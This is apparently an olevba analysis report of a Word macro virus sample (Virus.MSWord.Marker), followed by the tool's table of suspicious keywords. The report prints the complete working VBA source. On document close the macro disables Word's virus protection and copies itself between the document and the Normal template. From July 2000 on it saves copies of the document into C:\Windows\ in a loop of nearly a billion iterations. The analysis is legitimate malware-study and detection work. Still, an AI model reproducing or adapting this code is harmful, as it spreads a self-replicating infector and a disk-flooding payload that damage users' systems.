olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.ba-2e792d2513503ce543e550e2851d2796db718efa
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.ba-2e792d2513503ce543e550e2851d2796db718efa - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' U4073
' U
'
' 2000/01/04 03:46:32 PM
'
Private Sub Document_close()
  
  On Error GoTo Finm
  If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
      Const exi = "la macro de colombia xx"
      Dim DInfec, planinfec As Boolean
      Dim Docu, Plan As Object
      Dim modulin, contemodu, Ninfec As String
      Dim Nume As Integer
      Dim Copform As Object
  
   
      Set Docu = ActiveDocument.VBProject.VBComponents.Item(1)
      Set Plan = NormalTemplate.VBProject.VBComponents.Item(1)
      
      SaveDoc = ActiveDocument.Saved
      Saveplan = NormalTemplate.Saved
   
      DInfec = Docu.CodeModule.Find(exi, 1, 1, 40000, 40000)
      Plainfec = Plan.CodeModule.Find(exi, 1, 1, 40000, 40000)

      'Ninfec = "'" & " "
      
      Options.VirusProtection = False
   
      Nume = Mid(Int(Rnd() * 10), 1, 1)
      Nume = Nume
      nume1 = 7
      Nume2 = 3
      If Nume = nume1 Or Nume = Nume2 Or Plainfec = False Then
         If DInfec = True And Plainfec = False Then
            On Error Resume Next
            For il = 1 To Plan.CodeModule.CountOfLines
                Plan.CodeModule.DeleteLines 1
            Next
            On Error GoTo Finm
            'Docu.CodeModule.addfromstring Ninfec
            contemodu = Docu.CodeModule.Lines(1, Docu.CodeModule.CountOfLines)
            Plan.CodeModule.addfromstring contemodu
         End If

         If DInfec = False And Plainfec = True Then
            On Error Resume Next
            For il = 1 To Docu.CodeModule.CountOfLines
                Docu.CodeModule.DeleteLines 1
            Next
            On Error GoTo Finm
           'Plan.CodeModule.addfromstring Ninfec
            contemodu = Plan.CodeModule.Lines(1, Plan.CodeModule.CountOfLines)
            Docu.CodeModule.addfromstring contemodu
         End If
         
         If SaveDoc = True Then ThisDocument.Save
         If SaveDoc = True And Plainfec = False Then NormalTemplate.Save
      End If
  End If
    sd = Day(Now()) & "-" & Month(Now()) & "-" & Year(Now())
  sd = Trim(sd)
  If Year(Now()) >= 2000 And Month(Now()) > 6 Then
    ChangeFileOpenDirectory "C:\Windows\"
    For i = 1 To 999999991
        ActiveDocument.SaveAs FileName:=("AA" & i & "AA.DOC"), FileFormat:= _
        wdFormatDocument, LockComments:=False, Password:="", AddToRecentFiles:= _
        True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
        False, SaveNativePictureFormat:=False, SaveFormsData:=False, _
        SaveAsAOCELetter:=False
    Next
  End If
  GoTo Finb
  
Finm:
  On Error Resume Next
  GoTo Finb
Finb:
 On Error Resume Next
End Sub









































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_close      |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

